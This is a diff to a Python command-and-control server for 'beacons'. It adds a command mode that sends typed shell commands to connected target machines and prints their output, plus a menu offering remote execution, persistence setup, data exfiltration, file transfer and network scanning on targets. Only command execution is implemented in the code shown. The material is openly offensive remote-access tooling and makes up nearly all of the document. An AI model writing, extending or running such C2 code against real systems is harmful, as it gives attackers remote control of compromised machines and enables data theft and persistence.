@@ -2,6 +2,9 @@ import socket
 import threading
 import pyfiglet
 import os
+import time
+import select
+import ssl
 
 socket_list = []
 
@@ -22,37 +25,73 @@ def listener_module():
     #     print("f{[i]}",soc.getpeername())
     #     i=i+1   
     i=int(input("Select:"))
-    if(i== 0):
+    if(i==0):
         os.system("cls")
         return
-    print(socket_list[i].getpeername())
+    print(socket_list[i-1].getpeername())
     response = manage_client(socket_list[i-1], socket_list[i-1].getpeername())
     if(response == "nuke"):
         return
     if(response == "exit"):
         listener_module()
 
-def manage_client(client_socket, client_address):
-    res=""
-    print(f"We have an incoming connection request accepted from {client_address}")
+####################################################################Beacon Menu#################################################
+
+def beacon_command(client_socket, client_address):
+    os.system("cls")
+    print("Command Mode")
     while True:
-        try:
-            message = client_socket.recv(10240)
-            print(f"Received from {client_address}: {message.decode('utf-8')}")
-            response = input(">> ")
-            if (message.decode('utf-8') == "nuke" or response == "nuke"):
-                client_socket.close()
-                socket_list.remove(client_socket)
-                print(f"Connection from {client_address} has been closed")
-                res="nuke"
-                break
-            if message.decode('utf-8') == "exit" or response == "exit":
-                res="exit"
-                break
-            client_socket.send(response.encode('utf-8'))
-        except ConnectionResetError:
-            break
-    return res    
+        client_socket.send("Command Mode".encode())
+        client_socket.send(input("$ ").encode())
+        output = client_socket.recv(10240)
+        print(output.decode())
+        if(output.decode()=="exit"):
+            os.system("cls")
+            return
+        if(output.decode()=="nuke"):
+            client_socket.close()
+            socket_list.remove(client_socket)
+            os.system("cls")
+            return
+        time.sleep(1)       
+
+
+
+
+
+####################################################################Beacon Menu End#################################################    
+
+def manage_client(client_socket, client_address):
+    os.system("cls")
+    print(f"We have an incoming connection request accepted from {client_address}")
+    
+    try:
+        # ASYNC receive message
+        message = client_socket.recv(10240) if select.select([client_socket], [], [],1)[0] else "UNK".encode()
+
+        print(f"Received from {client_address}: {message.decode('utf-8')}")
+        response = beacon_menu()
+        
+        if (message.decode('utf-8') == "nuke" or response == "nuke"):
+            client_socket.close()
+            socket_list.remove(client_socket)
+            print(f"Connection from {client_address} has been closed")
+            res="nuke"
+            return
+        if message.decode('utf-8') == "exit" or response == "exit":
+            res="exit"
+            return
+        
+        if int(response) == 1:
+            
+            beacon_command(client_socket, client_address)
+
+            
+        # client_socket.send(response.encode('utf-8'))
+    except ConnectionResetError:
+        print("Connection Error")
+        return
+    return "exit"    
     
 
 # Server function to accept connections
@@ -97,6 +136,39 @@ def menu():
     choice = input("=> ")
     return choice
 
+def beacon_menu():
+    print("Select an option for the beacon:")
+    print("1. Execute Commands on Target")
+    print("2. Upload Files")
+    print("3. Download Files")
+    print("4. Persistence Mechanism Setup")
+    print("5. Data Exfiltration")
+    print("6. Spawn New Processes")
+    print("7. System Information Gathering")
+    print("8. Network Scanning")
+    print("9. Unload Beacon")
+    print("10. Exit")
+    choice = input("=> ")
+    return choice
+
+
+
+
 if __name__ == "__main__":
    
     start_server()
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
